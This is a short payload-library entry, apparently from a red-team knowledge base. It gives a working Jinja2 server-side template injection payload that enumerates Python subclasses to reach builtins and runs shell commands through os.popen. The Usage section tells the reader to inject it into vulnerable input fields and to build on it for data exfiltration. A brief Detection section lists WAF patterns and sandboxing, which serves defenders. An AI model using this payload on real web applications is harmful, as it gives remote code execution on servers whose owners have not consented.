---
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:39.852981+00:00'
updated_at: '2023-04-10T20:23:43.581514+00:00'
tags:
  - SSTI
  - Jinja2
  - RCE
  - Popen
platforms:
  - Web
  - Python
validated: true
---

# Jinja2-SSTI-Base-Payload-for-Builtins-Access

## Code

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
```

## Description

This Jinja2 template payload exploits SSTI by enumerating Python subclasses to access builtins without offset guessing, imports the os module, and executes a test command ('ls') via popen to confirm RCE capability. It targets the warnings.catch_warnings class for reliable execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| N/A | No user variables; customize the popen command (e.g., replace "ls" with other commands) | popen("id") |

## Usage

Inject this payload into a vulnerable Jinja2-rendered input field (e.g., via GET/POST request to a search endpoint). The response will include the output of the executed command if successful. Use this as a base to build more complex payloads for data exfiltration or command execution in red team engagements.

## Detection

- Monitor web application logs for template rendering errors or anomalous Python executions.
- WAF rules detecting SSTI patterns like {{ }} loops, __class__.__base__.__subclasses__(), or popen calls.
- Network anomalies from unexpected command outputs in HTTP responses.
- Enable Jinja2 sandboxing or autoescaping to prevent such injections.

## Related

- [[procedures/Exploit-Jinja2-SSTI-with-Popen-for-RCE]]
